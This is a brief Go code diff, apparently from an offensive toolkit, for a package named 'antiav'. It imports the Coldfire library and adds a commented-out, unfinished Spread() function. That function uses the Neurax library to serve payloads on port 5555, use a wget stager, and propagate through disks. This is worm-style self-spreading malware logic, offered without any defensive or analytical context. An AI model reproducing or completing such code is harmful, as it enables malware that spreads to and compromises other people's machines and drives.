@@ -2,6 +2,7 @@ package antiav
 
 import (
 	"github.com/redcode-labs/Coldfire"
+//	"github.com/redcode-labs/Neurax"
 )
 
 
@@ -42,3 +43,11 @@ func Ports(ips []string) map[string][]int {
 func Threads() int {
 	return coldfire.StrToInt(coldfire.Info()["cpu_num"])
 }
+
+//func Spread() error {
+//	neurax.N.Port = 5555
+//	neurax.N.Stager = "wget"
+//	go neurax.NeuraxServer()
+//	neurax.NeuraxDisks()
+//	cmd_stager := neurax.NeuraxStager()
+//}
